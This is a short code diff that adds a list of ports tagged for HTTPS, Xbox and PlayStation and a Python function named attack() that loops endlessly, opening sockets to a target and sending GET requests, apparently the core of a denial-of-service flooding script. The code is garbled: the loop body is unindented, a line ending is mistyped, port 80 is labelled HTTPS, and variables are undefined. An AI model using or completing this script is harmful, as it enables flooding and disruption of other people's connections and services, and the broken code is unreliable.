@@ -1,0 +1,9 @@
+ports
+https 80
+xbox 3074
+ps 443
+def attack():
+    while True:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target, port))
+    s.sendto(('get /' + target + ' http/1.1\r\m').encode('ascii'),(target, port))
